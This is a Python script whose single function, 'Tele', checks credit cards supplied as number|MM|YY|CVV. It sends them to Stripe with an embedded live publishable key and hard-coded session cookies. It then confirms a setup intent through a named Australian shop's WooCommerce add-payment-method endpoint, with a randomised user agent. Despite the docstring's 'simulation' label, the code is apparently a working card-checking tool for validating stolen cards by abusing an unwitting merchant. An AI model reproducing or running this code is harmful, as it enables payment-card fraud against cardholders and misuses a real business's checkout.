import time
import requests
from fake_useragent import UserAgent
import random
import re

def Tele(ccx):
    """
    Checks a single credit card via Stripe API simulation.
    Expects input in the format: number|MM|YY|CVV.
    Returns a dict containing either success data or an error.
    """
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return {"error": {"message": "Invalid card format. Use number|MM|YY|CVV."}}
    n, mm, yy, cvp = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    session = requests.session()
    user_agent = UserAgent().random
    data = (
        f"type=card&card[number]={n}&card[cvc]={cvp}&card[exp_year]={yy}&card[exp_month]={mm}"
        "&allow_redisplay=unspecified&billing_details[address][country]=JP"
        "&pasted_fields=number&payment_user_agent=stripe.js%2F7b2f7dbc1b%3B+stripe-js-v3%2F7b2f7dbc1b%3B+payment-element%3B+deferred-intent"
        "&referrer=https%3A%2F%2Fmooretruckparts.com.au&time_on_page=30356"
        "&client_attribution_metadata[client_session_id]=d5c651c4-109b-41ab-9bfe-4ec557b84c1f"
        "&client_attribution_metadata[merchant_integration_source]=elements"
        "&client_attribution_metadata[merchant_integration_subtype]=payment-element"
        "&client_attribution_metadata[merchant_integration_version]=2021"
        "&client_attribution_metadata[payment_intent_creation_flow]=deferred"
        "&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
        "&guid=ad429388-2434-4467-be56-846e9e1e0572dbd96f"
        "&muid=201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c"
        "&sid=e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755"
        "&key=pk_live_51E8DVkChndEVEIPgg7ic3Q5wLpPCATsMKEMUITiJumFq7tgpF2dL8ZoPI5dDHtjSKZNCcyG5uileis8GPoy6DhZr00BymjyeIo"
        "&_stripe_version=2024-06-20"
    )
    try:
        response = session.post("https://api.stripe.com/v1/payment_methods", data=data, timeout=15)
    except requests.RequestException as e:
        return {"error": {"message": f"Network error: {e}"}}
    try:
        stripe_json = response.json()
    except Exception:
        return {"error": {"message": "Invalid response from payment gateway."}}
    if "id" not in stripe_json:
        return stripe_json
    stripe_id = stripe_json["id"]
    cookies = {
        'mailchimp_landing_site': 'https%3A%2F%2Fmooretruckparts.com.au%2Fmy-account',
        '__stripe_mid': '201dd5d7-c5da-4761-baa9-a49f8175c8667a4f5c',
        '__stripe_sid': 'e5d252cf-7cc4-45e3-80b3-7c762f6b938391c755',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://mooretruckparts.com.au',
        'Referer': 'https://mooretruckparts.com.au/my-account/add-payment-method/',
        'User-Agent': user_agent,
        'X-Requested-With': 'XMLHttpRequest'
    }
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data2 = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': stripe_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': '140468307b'
    }
    try:
        response2 = session.post("https://mooretruckparts.com.au/", params=params, cookies=cookies, headers=headers, data=data2, timeout=15)
    except requests.RequestException as e:
        return {"error": {"message": f"Network error: {e}"}}
    try:
        return response2.json()
    except Exception:
        return {"error": {"message": "Failed to parse confirmation response."}}
